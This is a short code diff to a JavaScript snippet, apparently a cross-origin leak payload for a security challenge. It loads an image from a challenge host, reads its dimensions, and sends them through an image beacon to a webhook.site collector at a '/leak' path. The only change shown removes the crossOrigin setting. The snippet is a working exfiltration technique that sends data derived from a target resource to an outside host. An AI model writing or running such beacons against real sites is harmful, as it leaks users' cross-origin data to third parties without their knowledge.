@@ -6,7 +6,6 @@
   const CHL = "https://chl-bc6b536e-3a26-4cdc-93f2-d2ef3a2b0d7b-imagen-importante.softwareseguro.com.ar";
   const COLLECTOR = "https://webhook.site/30081abc-370f-4d75-80bc-b825ded98ab6";
   const img = new Image();
-  img.crossOrigin = "anonymous";
   img.onload = () => {
     const w = img.naturalWidth, h = img.naturalHeight, nivel = w * h;
     new Image().src = COLLECTOR + "/leak?w=" + w + "&h=" + h + "&nivel=" + nivel + "&t=" + Date.now();
